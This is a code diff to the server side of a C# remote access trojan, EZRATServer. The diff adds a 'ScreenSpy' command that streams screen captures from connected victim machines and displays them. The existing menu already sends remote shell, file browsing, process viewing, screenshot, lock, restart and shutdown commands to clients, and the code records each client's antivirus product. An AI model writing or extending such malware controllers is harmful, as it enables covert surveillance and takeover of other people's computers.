@@ -18,6 +18,7 @@ using EZRATServer.Forms;
 using Timer = System.Windows.Forms.Timer;
 using static EZRATServer.Utils.Constantes;
 
+
 namespace EZRATServer
 {
     public partial class Server : Form
@@ -27,6 +28,8 @@ namespace EZRATServer
         private AutoResetEvent ConnectEvent = new AutoResetEvent(false);
         private ManualResetEvent TcpClientConnected = new ManualResetEvent(false);
         private Thread TConnect;
+        private Thread scrnThread;
+        public bool OnOffscreenSpy = false;
         private int _port = 0;
         private static Socket _serverSocket;
         private uint screenShotNumber = 0;
@@ -35,6 +38,7 @@ namespace EZRATServer
         ProcessViewer pc;
         ShellCommand cmd;
         SystemDetails sys;
+        ScreenShotViewer scrn;
 
 
         Timer tmr = new Timer();
@@ -293,50 +297,61 @@ namespace EZRATServer
             (this.imageContextMenu1.Items[6] as ToolStripMenuItem).DropDownItemClicked += RightClickSelect;
         }
 
-
+        public int GetIdClient()
+        {
+            int result = 0;
+            if (this.lstClients.InvokeRequired)
+                this.lstClients.Invoke(new Action(() => { result = this.lstClients.SelectedIndices[0]; }));
+            else
+                result = this.lstClients.SelectedIndices[0];
+            return result;
+        }
         void RightClickSelect(object sender, ToolStripItemClickedEventArgs e)
         {
             switch (e.ClickedItem.Text)
             {
                 case "File Browser":
-                    fl = new FileBrowser(this, this.lstClients.SelectedIndices[0]);
+                    fl = new FileBrowser(this, GetIdClient() );
                     fl.Show();
-                    SendCommand("lsdrives", this.lstClients.SelectedIndices[0]);
-                    SendCommand("lsfiles", this.lstClients.SelectedIndices[0]);
+                    SendCommand("lsdrives", GetIdClient());
+                    SendCommand("lsfiles", GetIdClient());
                     break;
                 case "Chat":
-                    cht = new Chat(this, this.lstClients.SelectedIndices[0]);
-                    SendCommand("chat;", this.lstClients.SelectedIndices[0]);
+                    cht = new Chat(this, GetIdClient());
+                    SendCommand("chat;", GetIdClient());
                     cht.Show();
                     break;
                 case "Process Viewer":
-                    pc = new ProcessViewer(this, this.lstClients.SelectedIndices[0]);
-                    SendCommand("procview;", this.lstClients.SelectedIndices[0]);
+                    pc = new ProcessViewer(this, GetIdClient());
+                    SendCommand("procview;", GetIdClient());
                     pc.Show();
                     break;
                 case "ScreenShot":
-                    SendCommand("scrnshot;", this.lstClients.SelectedIndices[0]);
+                    SendCommand("scrnshot;", GetIdClient());
                     break;
                 case "Shell":
-                    cmd = new ShellCommand(this, "C:\\" , this.lstClients.SelectedIndices[0]);
+                    cmd = new ShellCommand(this, "C:\\", GetIdClient());
                     cmd.Show();
                     break;
                 case "System Info":
                     sys = new SystemDetails();
                     sys.Show();
-                    SendCommand("sysinfo;", this.lstClients.SelectedIndices[0]);
+                    SendCommand("sysinfo;", GetIdClient());
                     break;
                 case "Lock":
-                    SendCommand("control;0", this.lstClients.SelectedIndices[0]);
+                    SendCommand("control;0", GetIdClient());
                     break;
                 case "Restart":
-                    SendCommand("control;1", this.lstClients.SelectedIndices[0]);
+                    SendCommand("control;1", GetIdClient());
                     break;
                 case "Shutdown":
-                    SendCommand("control;2", this.lstClients.SelectedIndices[0]);
+                    SendCommand("control;2", GetIdClient());
                     break;
                 case "MessageBox":
-                    SendCommand("msgbox;" + new MessageBoxEditor().Dialog(), this.lstClients.SelectedIndices[0]);
+                    SendCommand("msgbox;" + new MessageBoxEditor().Dialog(), GetIdClient());
+                    break;
+                case "ScreenSpy":
+                    SendCommand("screenspy;", GetIdClient());
                     break;
                 default:
                     break;
@@ -651,7 +666,7 @@ namespace EZRATServer
                         string windows = lines[3]; //The computer's installed Anti Virus product
                         string version = lines[4];
 
-                        AddToData(new ClientData(id, ip, name, user, windows,version)); //Update the UI
+                        AddToData(new ClientData(id, ip, name, user, windows, version)); //Update the UI
                     }
                     else if (text.StartsWith("lsdrives;"))
                     {
@@ -716,6 +731,13 @@ namespace EZRATServer
                         sys.Invoke(new MethodInvoker(() => { sys.UpdateData(lines); }));
 
                     }
+                    else if (text.StartsWith("screenspy;"))
+                    {
+                        text = text.Substring(10);
+                        byte[] img = Encoding.Default.GetBytes(text);
+
+                        ShowScreenShot(StreamToImage(img));
+                    }
                 }
 
 
@@ -725,7 +747,33 @@ namespace EZRATServer
             if (!dclient) current.BeginReceive(_buffer, 0, _BUFFER_SIZE, SocketFlags.None, ReceiveCallback, current); //If client is not disconnecting, restart the reading
         }
 
+        public void ShowScreenShot(Image img)
+        {
+            if (scrn == null || OnOffscreenSpy == false)
+            {
+                scrnThread = new Thread(() =>
+                {
+                    scrn = new ScreenShotViewer(img,this);
+                    scrn.ShowDialog();
+                });
+                scrnThread.Start();
+                OnOffscreenSpy = true;
+            }
+            else
+            {
+                scrn.Img = img;
+            }
+        }
 
+        private Image StreamToImage(byte[] img)
+        {
+            Bitmap result;
+            using (MemoryStream ms = new MemoryStream(img))
+            {
+                result = new Bitmap(ms);
+            }
+            return result;
+        }
         private void SaveScreenShot(Image img)
         {
             string dir = Environment.CurrentDirectory + @"\ScreenShot\";
@@ -787,7 +835,7 @@ namespace EZRATServer
         {
             if (!lstClients.InvokeRequired)
             {
-                this.lstClients.Items.Add(new ListViewItem(new string[] { data.Id.ToString(), data.Ip, data.Name, data.User, data.Windows,data.Version }));
+                this.lstClients.Items.Add(new ListViewItem(new string[] { data.Id.ToString(), data.Ip, data.Name, data.User, data.Windows, data.Version }));
             }
             else
             {
